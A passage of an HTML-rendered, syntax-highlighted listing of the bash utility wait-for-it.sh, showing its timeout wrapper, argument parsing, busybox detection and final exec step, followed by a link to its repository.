    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_QUIET&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 1 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_BUSYTIMEFLAG&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--quiet&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--child&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt; &amp;amp;
    &lt;span class=&quot;k&quot;&gt;else
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_BUSYTIMEFLAG&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--child&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt; &amp;amp;
    &lt;span class=&quot;k&quot;&gt;fi
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$!&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;kill -INT -&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PID&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; INT
    &lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PID&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;WAITFORIT_RESULT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_RESULT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;echoerr &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_cmdname&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: timeout occurred after waiting &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; seconds for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi
    return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_RESULT&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# process arguments&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-gt&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
    case&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_hostport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;//&lt;/span&gt;:/&lt;span class=&quot;p&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_hostport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[0]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_hostport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[1]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;1
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--child&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_CHILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
        &lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;1
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--quiet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_QUIET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
        &lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;1
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--strict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_STRICT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
        &lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;1
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;2
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;#*=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;1
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;2
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;#*=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;1
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_TIMEOUT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;2
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_TIMEOUT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;#*=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;1
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;shift
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_CLI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        usage
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        echoerr &lt;span class=&quot;s2&quot;&gt;&quot;Unknown argument: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        usage
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done

if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;echoerr &lt;span class=&quot;s2&quot;&gt;&quot;Error: you need to provide a host and port to test.&quot;&lt;/span&gt;
    usage
&lt;span class=&quot;k&quot;&gt;fi

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_TIMEOUT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_TIMEOUT&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;WAITFORIT_STRICT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_STRICT&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;WAITFORIT_CHILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_CHILD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;WAITFORIT_QUIET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_QUIET&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Check to see if timeout is from busybox?&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;WAITFORIT_TIMEOUT_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;WAITFORIT_TIMEOUT_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;realpath&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT_PATH&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT_PATH&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;WAITFORIT_BUSYTIMEFLAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT_PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~ &lt;span class=&quot;s2&quot;&gt;&quot;busybox&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_ISBUSY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
    &lt;span class=&quot;c&quot;&gt;# Check if busybox timeout uses -t flag&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# (recent Alpine versions don't support -t anymore)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt; &amp;amp;&amp;gt;/dev/stdout | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'-t '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_BUSYTIMEFLAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-t&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi
else
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_ISBUSY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
&lt;span class=&quot;k&quot;&gt;fi

if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_CHILD&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-gt&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;wait_for
    &lt;span class=&quot;nv&quot;&gt;WAITFORIT_RESULT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_RESULT&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else
    if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-gt&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;wait_for_wrapper
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_RESULT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else
        &lt;/span&gt;wait_for
        &lt;span class=&quot;nv&quot;&gt;WAITFORIT_RESULT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi
fi

if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_CLI&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_RESULT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_STRICT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 1 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;echoerr &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_cmdname&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: strict mode, refusing to execute subprocess&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_RESULT&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_CLI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[@]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_RESULT&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;wait-for-it.sh, &lt;a href=&quot;https://github.com/vishnubob/wait-for-it.git&quot;&gt;https://github.com/vishnubob/wait-for-it.git&lt;/a&gt;&lt;/p&gt;

